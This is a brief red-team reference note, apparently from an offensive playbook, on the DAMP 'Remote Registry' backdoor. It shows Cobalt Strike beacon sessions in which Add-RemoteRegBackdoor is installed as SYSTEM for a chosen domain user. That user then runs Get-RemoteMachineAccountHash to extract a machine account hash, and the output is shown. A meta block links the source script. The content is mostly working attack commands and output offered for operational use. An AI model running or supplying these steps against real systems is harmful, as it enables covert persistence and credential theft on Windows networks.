
## [[Remote Registry]]
`Add-RemoteRegBackdoor` can be run locally on a compromised machine, or remotely with credentials.
```beacon
beacon> run hostname
srv2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> powershell Add-RemoteRegBackdoor -Trustee EDU\john
ComputerName BackdoorTrustee
------------ ---------------
SRV2        EDU\john
```

```beacon
beacon> getuid
[*] You are EDU\john

beacon> ls \\srv2\c$
[-] could not open \\srv2\c$\*: 5

beacon> powershell Get-RemoteMachineAccountHash -ComputerName srv2

ComputerName MachineAccountHash              
------------ ------------------              
srv2        5d0d485386727a8a92498a2c188627ec
```


```meta
requirements: 
results: 
oss: 
source: https://github.com/HarmJ0y/DAMP/blob/master/Add-RemoteRegBackdoor.ps1
description: Implements a new remote registry backdoor that allows for the remote retrieval of a system's machine account hash.
undetected: 
```
